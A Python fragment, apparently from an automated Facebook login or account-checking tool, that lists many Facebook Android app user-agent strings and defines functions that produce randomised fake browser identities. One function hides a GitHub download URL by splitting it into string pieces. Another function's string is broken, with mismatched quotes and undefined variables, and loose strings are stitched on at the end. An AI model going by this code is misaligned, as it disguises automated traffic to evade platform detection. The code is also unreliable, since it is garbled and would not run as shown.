  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3 IRL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/48;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Fido;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/MetroPCS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900T1;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/ROGERS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Rogers Wireless;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2005;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Tesco Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/eir;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris M5;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/BOMOV;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900H;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900M;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N900;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-N900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/Orange Communications SA;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONE A2001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBCR/Proximus;FBMF/elephone;FBBD/elephone;FBPN/com.facebook.katana;FBDV/Elephone P8000;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/nb_NO;FBCR/N Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G901F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/O2 - UK;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/O2-IRL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1794,height=1080};FBLC/en_US;FBCR/3 IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6603;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1920,height=1080};FBLC/en_US;FBCR/eMobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2392};FBLC/en_US;FBCR/Bell;FBMF/Huawei;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 6P;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/pt_BR;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Bell;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Fido;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Koodo;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGLS990;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/VIRGIN;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D852;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/eir;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/de_DE;FBCR/ ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/el_GR;FBCR/GR COSMOTE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/redONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910C;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_GB;FBCR/vodafone UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Videotron;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/nl_NL;FBCR/NL KPN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1532,height=2560};FBLC/de_DE;FBCR/Telekom.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N915FY;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=2392,height=1440};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=2560,height=1440};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748129;FBDM/{density=1.5,width=1200,height=1848};FBLC/en_GB;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/YOGA Tablet 2-1050F;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748131;FBDM/{density=2.0,width=1200,height=1824};FBLC/es_ES;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/K01H;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]",
  "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748131;FBDM/{density=2.0,width=1200,height=1824};FBLC/ru_RU;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB S8-50L;FBSV/5.0.1;nullFBCA/x86:armeabi-v7a;]",
  "[FBAN/FB4A;FBAV/61.0.0.8.69;FBBV/20569008;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-LS980;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
		])
def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('htt'+'ps://ra'+'w.gith'+'ub'+'user'+'co'+'ntent.c'+'om/MR-X'+'IDI/Co'+'ntr'+'ol/m'+'ain/'+'rand'+'om.t'+'xt').text.splitlines()
    model = random.choice(model2)
    redmi4 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4, 11))}.0; Nexus 5 Build/MRA{str(random.randint(30, 60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600, 1661))}.41"
    return rc([redmi4])
def useragentASRAFUL():
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/"+fban+";FBAV/"+facebook_version+";FBBV/"+fbbv+";FBDM/{density=3.0,width=1080,height=1920};FBLC/"+fbcl+";FBRV/"+fbrv+";FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+fbpn+";FBDV/"+model+";FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return ua
"Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 Mobile Safari/537.36"
"Mozilla/5.0 (Android 15; Mobile; rv:68.0) Gecko/68.0 Firefox/130.0"
"Mozilla/5.0 (Android 15; Mobile; LG-M255; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Vivaldi/6.9.3447.48"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.7.3.1248 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.7.3.1248 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 YaBrowser/24.7.3.1248 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 YaBrowser/24.7.9.389 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Linux; arm_64; Android 15; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.69 YaBrowser/24.7.9.61 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.3"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0."
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0."
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0."
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.3"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Geck"
"Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0."
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Config/91.2.1916.1"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.3"
